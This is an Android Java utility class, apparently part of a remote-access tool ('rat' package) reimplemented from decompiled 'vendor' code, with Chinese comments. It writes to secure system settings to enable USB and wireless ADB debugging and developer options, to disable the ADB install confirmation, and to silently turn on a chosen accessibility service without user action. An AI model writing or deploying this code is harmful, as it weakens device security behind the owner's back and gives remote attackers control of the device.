package com.vendor.rat.utils;

import android.content.ContentResolver;
import android.content.Context;
import android.provider.Settings;
import android.util.Log;

import androidx.core.content.ContextCompat;

/**
 * Settings.Secure / Settings.Global 写入工具
 * 需要 WRITE_SECURE_SETTINGS 权限 (通过 ADB pm grant 授予)
 *
 * 对标 vendor: utils/g.java — j()/I()/J()/K()/L()/D() 方法
 */
public final class SecureSettingsWriter {

    private static final String TAG = "SecureSettingsWriter";

    private SecureSettingsWriter() {}

    // ====== 权限检查 ======

    /** 检查是否有 WRITE_SECURE_SETTINGS 权限 — vendor g.j() */
    public static boolean hasPermission(Context ctx) {
        if (ctx == null) return false;
        return ContextCompat.checkSelfPermission(ctx,
            "android.permission.WRITE_SECURE_SETTINGS") == 0;
    }

    // ====== 读取状态 ======

    /** USB 调试是否开启 — vendor g.I() */
    public static boolean isUsbDebugEnabled(Context ctx) {
        if (ctx == null) return false;
        try {
            return Settings.Global.getInt(ctx.getContentResolver(), "adb_enabled", 0) > 0;
        } catch (Exception e) { return false; }
    }

    /** 无线调试是否开启 — vendor g.J() */
    public static boolean isWifiDebugEnabled(Context ctx) {
        if (ctx == null) return false;
        try {
            return Settings.Global.getInt(ctx.getContentResolver(), "adb_wifi_enabled", 0) > 0;
        } catch (Exception e) { return false; }
    }

    /** 开发者选项是否开启 — vendor g.K() */
    public static boolean isDeveloperOptionsEnabled(Context ctx) {
        if (ctx == null) return false;
        try {
            return Settings.Global.getInt(ctx.getContentResolver(),
                "development_settings_enabled", 0) > 0;
        } catch (Exception e) { return false; }
    }

    // ====== 写入操作 (需要 WRITE_SECURE_SETTINGS) ======

    /** 开启无线调试 — vendor server/b.java Q1() */
    public static boolean enableWifiDebug(Context ctx) {
        return putGlobalInt(ctx, "adb_wifi_enabled", 1);
    }

    /** 关闭无线调试 */
    public static boolean disableWifiDebug(Context ctx) {
        return putGlobalInt(ctx, "adb_wifi_enabled", 0);
    }

    /** 开启 USB 调试 — vendor server/b.java O1() */
    public static boolean enableUsbDebug(Context ctx) {
        return putGlobalInt(ctx, "adb_enabled", 1);
    }

    /** 开启开发者选项 — vendor server/b.java P1() */
    public static boolean enableDeveloperOptions(Context ctx) {
        return putGlobalInt(ctx, "development_settings_enabled", 1);
    }

    /** 关闭 ADB 安装确认 — vendor g.D() */
    public static boolean disableAdbInstallConfirm(Context ctx) {
        return putSecureInt(ctx, "adb_install_need_confirm", 0);
    }

    /**
     * 自启无障碍服务 — vendor g.L()
     * 直接写入 Settings.Secure 开启指定无障碍服务，无需用户操作
     */
    public static boolean enableAccessibilityService(Context ctx, String serviceComponent) {
        if (!hasPermission(ctx) || serviceComponent == null) return false;
        try {
            ContentResolver resolver = ctx.getContentResolver();
            String current = Settings.Secure.getString(resolver, "enabled_accessibility_services");
            if (current == null) current = "";

            if (!current.contains(serviceComponent)) {
                String updated = current.isEmpty() ? serviceComponent : current + ":" + serviceComponent;
                Settings.Secure.putString(resolver, "enabled_accessibility_services", updated);
            }
            Settings.Secure.putInt(resolver, "accessibility_enabled", 1);
            Log.d(TAG, "无障碍服务已启用: " + serviceComponent);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "enableAccessibilityService failed", e);
            return false;
        }
    }

    // ====== 内部方法 ======

    private static boolean putGlobalInt(Context ctx, String key, int value) {
        if (!hasPermission(ctx)) {
            Log.w(TAG, "无 WRITE_SECURE_SETTINGS 权限, 无法写入 " + key);
            return false;
        }
        try {
            Settings.Global.putInt(ctx.getContentResolver(), key, value);
            Log.d(TAG, "Settings.Global." + key + " = " + value);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "putGlobalInt failed: " + key, e);
            return false;
        }
    }

    private static boolean putSecureInt(Context ctx, String key, int value) {
        if (!hasPermission(ctx)) return false;
        try {
            Settings.Secure.putInt(ctx.getContentResolver(), key, value);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "putSecureInt failed: " + key, e);
            return false;
        }
    }
}
